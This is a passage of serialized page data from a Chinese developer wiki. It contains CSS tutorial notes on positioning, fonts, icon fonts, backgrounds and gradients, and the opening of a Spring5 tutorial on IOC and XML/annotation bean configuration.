href="#">reference</a>\n      </li>\n    </ul>\n\n  </body>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n\n\n# 绝对定位下的元素布局\n\n水平布局\n\nleft + margin-left + border-left + padding-left + width + padding-right + border-right + margin-right + right = 包含块的内容区的宽度\n\n当我们开启了绝对定位后，水平方向的布局等式就需要添加left 和 right 两个值。此时规则和之前一样只是多添加了两个值。当发生过度约束，如果9个值中没有 auto 则自动调整right值以使等式满足，如果有auto，则自动调整auto的值以使等式满足。\n\n可设置auto的值\n\n * margin\n * width\n * left\n * right\n\n因为left 和 right的值默认是auto，所以如果不指定left和right。则等式不满足时，会自动调整这两个值。\n\n垂直方向布局的等式的也必须要满足：\n\ntop + margin-top/bottom + padding-top/bottom + border-top/bottom + height = 包含块的高度\n\n# 元素层级\n\n对于开启了定位元素，可以通过z-index属性来指定元素的层级。z-index需要一个整数作为参数，值越大元素的层级越高，元素的层级越高越优先显示。如果元素的层级一样，则优先显示靠下的元素。祖先的元素的层级再高也不会盖住后代元素。\n\n\n# 字体和背景\n\n# 字体\n\n字体相关的样式：\n\n * color 用来设置字体颜色\n\n * font-size 字体的大小\n\nfont-size相关的单位\n\n * em 相当于当前元素的一个font-size\n\n * rem 相对于根元素的一个font-size\n\nfont-family 字体族（字体的格式）\n\n * serif 衬线字体\n\n * sans-serif 非衬线字体\n\n * monospace 等宽字体\n\n指定字体的类别，浏览器会自动使用该类别下的字体，font-family 可以同时指定多个字体，多个字体间使用,隔开\n\n字体生效时优先使用第一个，第一个无法使用则使用第二个 以此类推。\n\n# 图标字体\n\n图标字体（iconfont）\n\n * 在网页中经常需要使用一些图标，可以通过图片来引入图标，但是图片大小本身比较大，并且非常的不灵活\n * 所以在使用图标时，我们还可以将图标直接设置为字体，然后通过font-face的形式来对字体进行引入\n * 这样我们就可以通过使用字体的形式来使用图标。\n\nfontawesome 使用步骤\n\n 1. 下载 https://fontawesome.com/\n 2. 解压\n 3. 将css和webfonts移动到项目中\n 4. 将all.css引入到网页中\n 5. 使用图标字体\n\n直接通过类名来使用图标字体\n\nclass="fas fa-bell"\nclass="fab fa-accessible-icon"\n\n<i class="fas fa-bell" style="font-size:80px; color:red;"></i>\n<i class="fas fa-bell-slash"></i>\n<i class="fab fa-accessible-icon"></i>\n<i class="fas fa-otter" style="font-size: 160px; color:green;"></i>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n通过伪元素来设置图标字体\n\n 1. 找到要设置图标的元素通过before或after选中\n\n 2. 在content中设置字体的编码\n\n 3. 设置字体的样式\n\ncontent: \'\\f1b0\';\n/* font-family: \'font awesome 5 brands\'; */\nfont-family: \'font awesome 5 free\';\nfont-weight: 900; \ncolor: blue;\nmargin-right: 10px;\n\n\n1\n2\n3\n4\n5\n6\n\n\n阿里图标字体库\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>document</title>\n    <link rel="stylesheet" href="./iconfont/iconfont.css">\n    <style>\n      i.iconfont{\n        font-size: 100px;\n      }\n\n      p::before{\n        content: \'\\e625\';\n        font-family: \'iconfont\';\n        font-size: 100px;\n      }\n    </style>\n  </head>\n  <body>\n\n    <i class="iconfont">&#xe61c;</i>\n    <i class="iconfont">&#xe622;</i>\n    <i class="iconfont">&#xe623;</i>\n\n    <i class="iconfont icon-qitalaji"></i>\n\n    <p>hello</p>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 字体设置\n\n行高（line height），行高指的是文字占有的实际高度。可以通过line-height来设置行高，行高可以直接指定一个大小（px em），也可以直接为行高设置一个整数。如果是一个整数的话，行高将会是字体的指定的倍数。行高经常还用来设置文字的行间距，行间距 = 行高 - 字体大小。\n\n字体框，字体框就是字体存在的格子，设置font-size实际上就是在设置字体框的高度，行高会在字体框的上下平均分配。\n\n字体可以使用下面的简写属性：\n\ndiv{\n  border: 1px red solid;\n  /* \n  font 可以设置字体相关的所有属性\n  语法：\n  font: 字体大小/行高 字体族\n  行高 可以省略不写 如果不写使用默认值\n  */\n\n  /* font-size: 50px;\n  font-family: \'times new roman\', times, serif; */\n  font-weight: bold;\n  /* font: 50px/2  微软雅黑, \'times new roman\', times, serif; */\n  /* font: normal normal 50px/2  微软雅黑, \'times new roman\', times, serif; */\n  font: bold italic 50px/2  微软雅黑, \'times new roman\', times, serif;\n  /* font:50px \'times new roman\', times, serif;\n  line-height: 2; */\n\n  /* font-size: 50px; */\n  /* font-weight 字重 字体的加粗 \n  可选值：\n  normal 默认值 不加粗\n  bold 加粗\n  100-900 九个级别（没什么用）\n  font-style 字体的风格\n  normal 正常的\n  italic 斜体\n  */\n  /* font-weight: bold; */\n  /* font-weight: 500;\n  font-style: italic; */\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 文本样式\n\ntext-align 文本的水平对齐\n\n * left 左侧对齐\n\n * right 右对齐\n\n * center 居中对齐\n\n * justify 两端对齐\n\nvertical-align 设置元素垂直对齐的方式\n\n * baseline 默认值 基线对齐\n\n * top 顶部对齐\n\n * bottom 底部对齐\n\n * middle 居中对齐\n\ntext-decoration 设置文本修饰\n\n * none 什么都没有\n\n * underline 下划线\n\n * line-through 删除线\n\n * overline 上划线\n\nwhite-space 设置网页如何处理空白\n\n * normal 正常\n\n * nowrap 不换行\n\n * pre 保留空白\n\n# 背景设置\n\nbackground-image 设置背景图片\n\n * 可以同时设置背景图片和背景颜色，这样背景颜色将会成为图片的背景色\n * 如果背景的图片小于元素，则背景图片会自动在元素中平铺将元素铺满\n * 如果背景的图片大于元素，将会一个部分背景无法完全显示\n * 如果背景图片和元素一样大，则会直接正常显示\n\nbackground-repeat 用来设置背景的重复方式\n\n * repeat 默认值 ， 背景会沿着x轴 y轴双方向重复\n\n * repeat-x 沿着x轴方向重复\n\n * repeat-y 沿着y轴方向重复\n\n * no-repeat 背景图片不重复\n\nbackground-position 用来设置背景图片的位置，通过 top left right bottom center 几个表示方位的词来设置背景图片的位置\n\n使用方位词时必须要同时指定两个值，如果只写一个则第二个默认就是center\n\n通过偏移量来指定背景图片的位置：水平方向的偏移量 垂直方向变量\n\nbackground-position: -50px 300px;\n\n设置背景的范围 background-clip\n\n * border-box 默认值，背景会出现在边框的下边\n\n * padding-box 背景不会出现在边框，只出现在内容区和内边距\n\n * content-box 背景只会出现在内容区\n\nbackground-origin 背景图片的偏移量计算的原点\n\n * padding-box 默认值，background-position从内边距处开始计算\n\n * content-box 背景图片的偏移量从内容区处计算\n\n * border-box 背景图片的变量从边框处开始计算\n\nbackground-size 设置背景图片的大小\n\n * 第一个值表示宽度\n\n * 第二个值表示高度\n\n如果只写一个，则第二个值默认是 auto，cover 图片的比例不变，将元素铺满。contain 图片比例不变，将图片在元素中完整显示。\n\nbackground-color\nbackground-image\nbackground-repeat\nbackground-position\nbackground-size\nbackground-origin\nbackground-clip\nbackground-attachment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nbackgound 背景相关的简写属性，所有背景相关的样式都可以通过该样式来设置。并且该样式没有顺序要求，也没有哪个属性是必须写的。\n\nbackground-size必须写在background-position的后边，并且使用/隔开，background-position/background-size。\n\nbackground-origin background-clip 两个样式 ，orgin要在clip的前边。\n\nbackground-attachment，背景图片是否跟随元素移动\n\n * scroll 默认值 背景图片会跟随元素移动\n\n * fixed 背景会固定在页面中，不会随元素移动\n\n# 渐变\n\n通过渐变可以设置一些复杂的背景颜色，可以实现从一个颜色向其他颜色过渡的效果，渐变是图片，需要通过background-image来设置\n\n线性渐变，颜色沿着一条直线发生变化，linear-gradient()\n\nlinear-gradient(red,yellow) 红色在开头，黄色在结尾，中间是过渡区域\n\n线性渐变的开头，我们可以指定一个渐变的方向\n\n * to left\n\n * to right\n\n * to bottom\n\n * to top\n\n * deg deg表示度数\n\n * turn 表示圈\n\n渐变可以同时指定多个颜色，多个颜色默认情况下平均分布，也可以手动指定渐变的分布情况\n\nrepeating-linear-gradient() 可以平铺的线性渐变\n\nradial-gradient() 径向渐变(放射性的效果)\n\n默认情况下径向渐变的形状根据元素的形状来计算的。正方形 --\x3e 圆形，长方形 --\x3e 椭圆形\n\n我们也可以手动指定径向渐变的大小\n\n * circle\n\n * ellipse\n\n也可以指定渐变的位置\n\nradial-gradient(大小 at 位置, 颜色 位置 ,颜色 位置 ,颜色 位置)\n\n大小\n\n * circle 圆形\n\n * ellipse 椭圆\n\n * closest-side 近边\n\n * closest-corner 近角\n\n * farthest-side 远边\n\n * farthest-corner 远角\n\n位置：\n\ntop right left center bottom\n\n\n# 动画\n\n\n# 响应式布局\n\n\n# 练习',charsets:{cjk:!0},lastUpdated:"2022/06/23, 01:35:59",lastUpdatedTimestamp:1655948159e3},{title:"Spring5",frontmatter:{title:"Spring5",date:"2022-01-01T00:00:00.000Z",permalink:"/dev/java/core/spring5",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Spring5"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/00.Spring5.html",relativePath:"01.开发/101.后端/1011.微服务核心/00.Spring5.md",key:"v-1068c768",path:"/dev/java/core/spring5/",headers:[{level:2,title:"Spring简介",slug:"spring简介",normalizedTitle:"spring简介",charIndex:14},{level:3,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:27},{level:3,title:"SpringDemo",slug:"springdemo",normalizedTitle:"springdemo",charIndex:286},{level:2,title:"SpringIOC",slug:"springioc",normalizedTitle:"springioc",charIndex:45},{level:3,title:"背景",slug:"背景",normalizedTitle:"背景",charIndex:1232},{level:3,title:"IOC底层原理",slug:"ioc底层原理",normalizedTitle:"ioc底层原理",charIndex:1397},{level:3,title:"Bean管理",slug:"bean管理",normalizedTitle:"bean管理",charIndex:1734},{level:2,title:"SpringAOP",slug:"springaop",normalizedTitle:"springaop",charIndex:62},{level:3,title:"AOP概念",slug:"aop概念",normalizedTitle:"aop概念",charIndex:15908},{level:3,title:"AOP底层原理",slug:"aop底层原理",normalizedTitle:"aop底层原理",charIndex:16029},{level:3,title:"AOP相关概念",slug:"aop相关概念",normalizedTitle:"aop相关概念",charIndex:17707},{level:3,title:"AOP环境准备",slug:"aop环境准备",normalizedTitle:"aop环境准备",charIndex:17851},{level:3,title:"基于注解方式的配置",slug:"基于注解方式的配置",normalizedTitle:"基于注解方式的配置",charIndex:18412},{level:3,title:"基于XML方式配置",slug:"基于xml方式配置",normalizedTitle:"基于xml方式配置",charIndex:21047},{level:2,title:"JdbcTemplate",slug:"jdbctemplate",normalizedTitle:"jdbctemplate",charIndex:22631},{level:3,title:"概述",slug:"概述-2",normalizedTitle:"概述",charIndex:27},{level:3,title:"准备工作",slug:"准备工作",normalizedTitle:"准备工作",charIndex:22705},{level:3,title:"CRUD",slug:"crud",normalizedTitle:"crud",charIndex:25636},{level:2,title:"事务",slug:"事务",normalizedTitle:"事务",charIndex:29506},{level:3,title:"概念",slug:"概念",normalizedTitle:"概念",charIndex:208},{level:3,title:"测试代码",slug:"测试代码",normalizedTitle:"测试代码",charIndex:957},{level:3,title:"事务的操作过程",slug:"事务的操作过程",normalizedTitle:"事务的操作过程",charIndex:30959},{level:3,title:"基于注解方式的事务管理",slug:"基于注解方式的事务管理",normalizedTitle:"基于注解方式的事务管理",charIndex:31201},{level:3,title:"基于XML配置事务",slug:"基于xml配置事务",normalizedTitle:"基于xml配置事务",charIndex:34184},{level:2,title:"Spring5新特性",slug:"spring5新特性",normalizedTitle:"spring5新特性",charIndex:36151},{level:3,title:"概述",slug:"概述-3",normalizedTitle:"概述",charIndex:27},{level:3,title:"整合日志框架",slug:"整合日志框架",normalizedTitle:"整合日志框架",charIndex:36233},{level:3,title:"Nullable注解",slug:"nullable注解",normalizedTitle:"nullable注解",charIndex:36777},{level:3,title:"核心容器支持函数式风格",slug:"核心容器支持函数式风格",normalizedTitle:"核心容器支持函数式风格",charIndex:36856},{level:3,title:"支持整合Junit5",slug:"支持整合junit5",normalizedTitle:"支持整合junit5",charIndex:37412},{level:3,title:"SpringWebflux",slug:"springwebflux",normalizedTitle:"springwebflux",charIndex:39044},{level:2,title:"Spring整合MyBatis",slug:"spring整合mybatis",normalizedTitle:"spring整合mybatis",charIndex:39105}],headersStr:"Spring简介 概述 SpringDemo SpringIOC 背景 IOC底层原理 Bean管理 SpringAOP AOP概念 AOP底层原理 AOP相关概念 AOP环境准备 基于注解方式的配置 基于XML方式配置 JdbcTemplate 概述 准备工作 CRUD 事务 概念 测试代码 事务的操作过程 基于注解方式的事务管理 基于XML配置事务 Spring5新特性 概述 整合日志框架 Nullable注解 核心容器支持函数式风格 支持整合Junit5 SpringWebflux Spring整合MyBatis",content:'# Spring5\n\n\n# Spring简介\n\n\n# 概述\n\nSpring是一个控制反转(SpringIOC)和面向切面的(SpringAOP)的轻量级框架。Spring是一个框架集,内部集成了很多的功能,可以根据需求选择对应的子框架使用。\n\n作用：\n\n * 简化企业项目的开发的流程，提升开发效率\n * 便于代码的后期维护升级\n * 将代码之间的耦合性降低\n\nSpring Framework 组成部分\n\n\n\n核心概念：\n\n * SpringIOC：控制反转，把创建对象过程交给Spring进行管理\n * SpringAOP：面向切面，不修改源代码进行功能增强\n\n\n# SpringDemo\n\n> Spring组件下载地址：JFrog (spring.io)\n\n 1. 创建项目，导入基础Jar包\n    \n    \n\n 2. 创建测试类\n\n\tpackage com.pwddd.spring5; \n\tpublic class User { \n\t\tpublic void add(){ \n\t\t\tSystem.out.println("add......."); \n\t\t} \n\t}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 创建配置文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:p="http://www.springframework.org/schema/p"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">\n\n    <bean id="user" class="com.pwddd.spring5.User" />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 4. 编写测试代码\n\n@Test\npublic void testAdd(){\n    ApplicationContext applicationContext = new ClassPathXmlApplicationContext("bean1.xml");\n    User user = applicationContext.getBean("user", User.class);\n    System.out.println(user);\n    user.add();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# SpringIOC\n\n\n# 背景\n\n在使用MVC的结构体系来完成后台功能代码的声明时，在一定程度上降低了代码的冗余，但是层与层之间的耦合性过高，造成代码升级维护特别麻烦。比如，某天业务层某个类文件需要替换为新的类文件，那么，控制层所有调用该业务类的代码需要全部修改为调用新的业务类。 解决办法就是将层与层对象之间的关系解耦，由直接关系变为间接关系。\n\n\n# IOC底层原理\n\n# 什么是IOC\n\n控制反转，把对象创建和对象之间的调用过程，交给Spring进行管理 使用IOC目的：为了耦合度降低\n\n# 原理讲解\n\n\n\n# BeanFactory接口\n\nIOC思想基于IOC容器完成，IOC容器底层就是对象工厂。Spring提供IOC容器实现两种方式：（两个接口）\n\n * BeanFactory：IOC容器基本实现，是Spring内部的使用接口，不提供开发人员进行使用\n   * 加载配置文件时候不会创建对象，在获取对象（使用）才去创建对象\n * ApplicationContext：BeanFactory接口的子接口，提供更多更强大的功能，一般由开发人员进行使用\n   * 加载配置文件时候就会把在配置文件对象进行创建\n\n\n# Bean管理\n\nBean管理包含两个方面：\n\n * Spring创建对象\n * Spring注入属性\n\nBean管理的两种方式：\n\n * 基于XML进行配置\n * 基于注解的方式实现\n\n# 基于XML进行配置\n\n# 创建对象\n\n在spring配置文件中，使用bean标签，标签里面添加对应属性，就可以实现对象创建。创建对象时，默认执行无参数构造方法完成对象的创建。在bean标签有很多属性，常用的属性有两个：\n\n * id属性：唯一标识\n * class属性：类全路径（包类路径）\n\nuser Bean配置：\n\n<bean id="user" class="com.pwddd.spring5.User" />\n\n\n1\n\n\n# 注入属性\n\n注入属性有两种方式：\n\n * 使用set方法进行注入\n * 使用构造器进行注入\n * p名称空间注入（实际上是set方法注入）\n\n# 使用set进行注入\n\n 1. 创建类，编写对应属性的set方法。\n\npackage com.pwddd.spring5;\n\npublic class Book {\n    public String name;\n    public String author;\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public void setAuthor(String author) {\n        this.author = author;\n    }\n\n    @Override\n    public String toString() {\n        return "Book{" +\n                "name=\'" + name + \'\\\'\' +\n                ", author=\'" + author + \'\\\'\' +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. 编写XML配置文件，使用property进行注入\n\n<bean id="book" class="com.pwddd.spring5.Book" >\n    <property name="name" value="红楼"></property>\n    <property name="author" value="曹雪芹"></property>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# 使用带参构造进行注入\n\n 1. 创建类，并生成带参构造器。\n\npackage com.pwddd.spring5;\n\npublic class Order {\n    public String id;\n    public String phone;\n\n    @Override\n    public String toString() {\n        return "Order{" +\n                "id=\'" + id + \'\\\'\' +\n                ", phone=\'" + phone + \'\\\'\' +\n                \'}\';\n    }\n\n    public Order(String id, String phone) {\n        this.id = id;\n        this.phone = phone;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 2. 编写配置XML配置文件，使用constructor-arg进行注入。\n\n<bean id="order" class="com.pwddd.spring5.Order" >\n    <constructor-arg index="0" value="00001"></constructor-arg>\n    <constructor-arg index="1" value="上海"></constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# P名称空间注入\n\n 1. 添加p名称空间xmlns\n\nxmlns:p="http://www.springframework.org/schema/p"\n\n\n1\n\n 2. 编写XML配置文件\n\n\x3c!--    p注入需要添加xmlns：p\n        p注入需要set方法\n--\x3e\n<bean id="book" class="com.pwddd.spring5.Book" p:name="西游记" p:author="hahah" />\n\n\n1\n2\n3\n4\n\n\n# 不同类型的属性注入方式\n\n# 字面量NULL\n\n<bean id="order" class="com.pwddd.spring5.Order" >\n  <constructor-arg index="0">\n      <null></null>\n  </constructor-arg>\n  <constructor-arg index="1">\n      <null></null>\n  </constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 包含特殊字符的属性值\n\n<constructor-arg index="1">\n    <value><![CDATA[<>hahah<>]]>&gt; &lt; </value>\n</constructor-arg>\n\n\n1\n2\n3\n\n\n# 外部bean\n\nUserService中需要依赖UserDao，可以使用外部Bean的方式将UserDao注入到UserService中。\n\n 1. 创建UserService\n\npackage com.pwddd.spring5.service.impl;\n\nimport com.pwddd.spring5.dao.UserDao;\nimport com.pwddd.spring5.service.UserService;\n\npublic class UserServiceImpl implements UserService {\n    private UserDao userDao;\n\n    public void setUserDao(UserDao userDao) {\n        this.userDao = userDao;\n    }\n\n    @Override\n    public void addUser() {\n        System.out.println("service...addUser");\n        userDao.addUser();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. 创建UserDao\n\npackage com.pwddd.spring5.dao.impl;\n\nimport com.pwddd.spring5.dao.UserDao;\n\npublic class UserDaoImpl implements UserDao {\n    @Override\n    public void addUser() {\n        System.out.println("dao......addUser");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 3. 编写配置文件，使用ref注入外部Bean\n\n<bean id="userService" class="com.pwddd.spring5.service.impl.UserServiceImpl">\n    <property name="userDao" ref="userDaoImpl"></property>\n</bean>\n\n<bean id="userDaoImpl" class="com.pwddd.spring5.dao.impl.UserDaoImpl"></bean>\n\n\n1\n2\n3\n4\n5\n\n 4. 编写测试代码\n\n@Test\npublic void testUser(){\n\tUserService userService = context.getBean("userService", UserService.class);\n\tuserService.addUser();\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 内部Bean\n\n如果需要在实体类中表示类和类之间的对应关系，可以使用内部Bean方式进行表示。\n\n 1. 编写测试Dept类\n\npackage com.pwddd.spring5;\n\npublic class Dept {\n    private String dname;\n    public void setDname(String dname) {\n        this.dname = dname;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 编写测试Emp类\n\npackage com.pwddd.spring5;\n\npublic class Emp {\n    private String ename;\n    private String gender;\n    //员工属于某一个部门，使用对象形式表示\n    private Dept dept;\n    public void setDept(Dept dept) {\n        this.dept = dept;\n    }\n    public void setEname(String ename) {\n        this.ename = ename;\n    }\n    public void setGender(String gender) {\n        this.gender = gender;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 3. 第一种方式配置文件\n\n<bean id="emp" class="com.pwddd.spring5.Emp">\n  <property name="ename"  value="lalal"></property>\n  <property name="gender" value="male"></property>\n  <property name="dept">\n      <bean id="dept" class="com.pwddd.spring5.Dept">\n          <property name="dname" value="安保"></property> \n      </bean>\n  </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 第二种方式需要在Emp中生成Dept的get方法\n\npublic Dept getDept() { return dept; }\n\n\n1\n\n 5. 第二种方式配置文件\n\n<bean id="emp" class="com.pwddd.spring5.Emp">\n    <property name="gender" value="male"></property>\n    <property name="ename"  value="lalal"></property>\n    <property name="dept" ref="dept"></property>\n    <property name="dept.dname" value="保安"></property>\n</bean>\n<bean id="dept" class="com.pwddd.spring5.Dept">\n    <property name="dname"  value="财务"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 集合类型\n\n集合类型支持Array、List、Map、set等类型。\n\n 1. 编写测试类，类中包含集合类型的依赖关系\n\npackage com.pwddd.spring5;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class Stu {\n    public String[] courses;\n\n    public List<String> lists;\n\n    public Map<String, String> maps;\n\n    public Set<String> sets;\n\n    public void setCourses(String[] courses) {\n        this.courses = courses;\n    }\n\n    public void setLists(List<String> lists) {\n        this.lists = lists;\n    }\n\n    public void setMaps(Map<String, String> maps) {\n        this.maps = maps;\n    }\n\n    public void setSets(Set<String> sets) {\n        this.sets = sets;\n    }\n\n    @Override\n    public String toString() {\n        return "Stu{" +\n                "courses=" + Arrays.toString(courses) +\n                ", lists=" + lists +\n                ", maps=" + maps +\n                ", sets=" + sets +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n 2. 编写XML配置文件配置注入。\n\n<bean id="stu" class="com.pwddd.spring5.Stu">\n    <property name="courses">\n        <array>\n            <value>语文</value>\n            <value>数学</value>\n        </array>\n    </property>\n\n    <property name="lists">\n        <list>\n            <value>张三</value>\n            <value>李四</value>\n        </list>\n    </property>\n\n    <property name="maps">\n        <map>\n            <entry key="Java" value="1"></entry>\n            <entry key="C" value="2"></entry>\n        </map>\n    </property>\n\n    <property name="sets">\n        <set>\n            <value>aaa</value>\n            <value>bbb</value>\n        </set>\n    </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# 集合内容提取\n\n如果多个依赖注入需要引用相同的集合值，那么可以将集合值提取出来，用的时候直接引用即可。提取需要引入util。\n\n实例XML配置：\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xsi:schemaLocation="\n       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n<util:list id="bookList">\n        <value>haha</value>\n        <value>lala</value>\n    </util:list>\n\n    <bean id="book" class="com.pwddd.spring5.Book">\n        <property name="bookList" ref="bookList"></property>\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 工厂Bean\n\nSpring有两种类型bean，一种普通bean，另外一种工厂bean（FactoryBean，不同于BeanFactory）\n\n * 普通bean：在配置文件中定义bean类型就是返回类型\n * 工厂bean：在配置文件定义bean类型可以和返回类型不一样\n\n工厂Bean的使用方式：\n\n 1. 创建类，使这个类成为工厂，并实现FactoryBean接口\n\npackage com.pwddd.spring5;\n\nimport com.pwddd.spring5.Course;\nimport org.springframework.beans.factory.FactoryBean;\n\npublic class MyFactoryBean implements FactoryBean<Course> {\n  @Override\n  public Course getObject() throws Exception {\n\t  Course course = new Course();\n\t  course.setcName("aaa");\n\t  return course;\n  }\n\n  @Override\n  public Class<?> getObjectType() {\n\t  return Course.class;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. 实现接口里面的方法，在实现的方法中定义返回的bean类型\n\n<bean id="factoryBean" class="com.pwddd.spring5.MyFactoryBean"></bean>\n\n\n1\n\n\n# Bean的作用域\n\n在Spring里面，默认情况下，bean是单实例对象。\n\n\n\n可以通过配置文件设置Bean是单例的还是多例的模式： 在spring配置文件bean标签里面有属性（scope）用于设置单实例还是多实例 第一个值 默认值，singleton，表示是单实例对象 第二个值prototype，表示是多实例对象\n\n<bean id="course" class="com.pwddd.spring5.Course" scope="prototype"></bean>\n\n\n1\n\n\nsingleton和prototype区别\n\n * singleton单实例，prototype多实例\n * 设置scope值是singleton时候，加载spring配置文件时候就会创建单实例对象\n * 设置scope值是prototype时候，不是在加载spring配置文件时候创建对象，在调用getBean方法时候创建多实例对象\n\n# Bean生命周期和后置处理器\n\n# Bean生命周期\n\n * 通过构造器创建bean实例（无参数构造）\n * 为bean的属性设置值和对其他bean引用（调用set方法）\n * 把bean实例传递bean后置处理器的方法postProcessBeforeInitialization\n * 调用bean的初始化的方法（需要进行配置初始化的方法）\n * 把bean实例传递bean后置处理器的方法 postProcessAfterInitialization\n * bean可以使用了（对象获取到了）\n * 当容器关闭时候，调用bean的销毁的方法（需要进行配置销毁的方法）\n\n# 后置处理器\n\n创建后置处理器需要实现BeanPostProcessor接口，并重写%Before%和%After%两个方法。\n\n# 属性自动装配\n\n根据指定装配规则（属性名称或者属性类型），Spring自动将匹配的属性值进行注入。\n\n根据名称自动装配\n<bean id="emp" class="com.pwddd.spring5.Emp" autowire="byName"></bean>\n    <bean id="dept" class="com.pwddd.spring5.Dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.Dept"></bean>\n\n根据类型自动装配  报错 存在两个相同的类型\n<bean id="emp" class="com.pwddd.spring5.Emp" autowire="byType"></bean>\n    <bean id="dept" class="com.pwddd.spring5.Dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.Dept"></bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 引入外部配置文件\n\n配置数据源的方式1：\n\n<bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n    <property name="url" value="jdbc:mysql://localhost:3306/aaaa" />\n    <property name="username" value="root" />\n    <property name="password" value="root" />\n    <property name="driverClassName" value="com.mysql.jdbc.driver" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n\n\n配置数据源的方式2：\n\n 1. 创建jdbc.properties外部配置文件\n\njdbc.url=jdbc:mysql://localhost:3306/aaa\njdbc.username=root\njdbc.password=root\njdbc.driver=com.jdbc.mysql.driver\n\n\n1\n2\n3\n4\n\n 2. 引入到XML中，并进行引用。\n\n<context:property-placeholder location="classpath:jdbc.properties"></context:property-placeholder>\n<bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n    <property name="driverClassName" value="${jdbc.driver}"/>\n    <property name="username" value="${jdbc.username}" />\n    <property name="url" value="${jdbc.url}" />\n    <property name="password" value="${jdbc.password}" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 基于注解进行配置\n\n注解是代码特殊标记，格式：@注解名称(属性名称=属性值, 属性名称=属性值..)。注解可以放在类上面、方法上面、属性上面。使用注解进行配置可以简化XML文件。\n\n# 创建对象\n\nSpring针对Bean管理中创建对象提供注解\n\n * @Component -- 普通bean\n * @Service -- service层\n * @Controller -- controller层\n * @Repository --dao层\n\n使用方式：\n\n 1. 开启组件扫描\n\n<?xml version="1.0" 